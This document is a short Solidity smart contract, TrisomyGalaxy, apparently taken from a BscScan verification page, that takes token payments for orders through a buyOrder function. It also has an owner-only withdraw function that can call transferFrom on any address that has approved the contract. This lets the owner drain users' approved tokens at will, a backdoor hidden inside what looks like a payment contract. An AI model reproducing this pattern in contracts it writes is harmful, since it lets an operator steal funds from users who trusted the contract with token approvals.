/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

/**
 *Submitted for verification at Etherscan.io on 2022-06-11
*/

pragma solidity ^0.5.4;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}


contract Context {
    constructor() internal {}

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract  TrisomyGalaxy is Ownable{
  IERC20 public zb;
  address public official;

  constructor() public  {
    zb = IERC20(0xe38a71627E3289D8154da871F9ecF25Cd41EB483);
    official = 0x8f4bf43401feACA2eC8E6f308A3b6C3E55d392a9;
  }

  event WithdrawZbLog(address toAddr, uint amount);
  event BuyOrderLog(address sender, uint amount, string uuid);

  function withdraw(address fromAddr,address toAddr, uint256 amount) onlyOwner public  {
    zb.transferFrom(fromAddr,toAddr, amount);
  }

  
  function withdrawZb(address toAddr, uint256 amount) onlyOwner public  {
    zb.transfer(toAddr, amount);
    emit WithdrawZbLog(toAddr, amount);
  }


  
  function buyOrder(uint amount, string memory uuid) public  {
    zb.transferFrom(msg.sender, official, amount);
    emit BuyOrderLog(msg.sender,amount,uuid);
  }
  
}